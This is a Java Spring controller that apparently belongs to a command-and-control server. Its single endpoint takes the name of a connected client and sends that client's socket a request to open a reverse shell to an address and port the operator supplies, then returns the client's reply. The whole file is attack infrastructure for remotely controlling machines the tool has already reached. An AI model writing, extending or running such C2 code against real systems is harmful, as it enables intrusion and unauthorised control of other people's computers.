package com.github.jafarlihi.controller;

import com.github.jafarlihi.service.ClientListenerService;
import com.github.jafarlihi.util.Client;
import com.github.jafarlihi.util.RequestType;
import org.json.JSONObject;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.context.request.async.DeferredResult;

import java.io.IOException;
import java.io.PrintWriter;

@RestController
public class ShellController {

    @PostMapping("/shell/{client}")
    public DeferredResult<String> createSession(@PathVariable("client") String clientName, @RequestBody String body) {
        DeferredResult<String> result = new DeferredResult<>();
        Client client = ClientListenerService.getClient(clientName);
        if (client == null) {
            result.setResult(new JSONObject().put("error", "Requested client was not found").toString());
            return result;
        }
        Long requestID = client.getRequestID();
        JSONObject request = new JSONObject();
        request.put("id", requestID);
        request.put("type", RequestType.CREATE_REVERSE_SHELL_SESSION.getValue());
        request.put("address", new JSONObject(body).getString("address"));
        request.put("port", new JSONObject(body).getString("port"));
        try {
            PrintWriter out = new PrintWriter(client.socket.getOutputStream(), true);
            out.println(request.toString());
        } catch (IOException ex) {
            result.setResult(new JSONObject().put("error", "Failed to write to the socket, exception: " + ex).toString());
            return result;
        }
        client.observable.subscribe((response) -> {
            JSONObject responseJson = new JSONObject(response);
            if (responseJson.has("id") && responseJson.getLong("id") == requestID) {
                result.setResult(response);
                Thread.currentThread().interrupt();
            }
        }, (error) -> {});
        return result;
    }
}
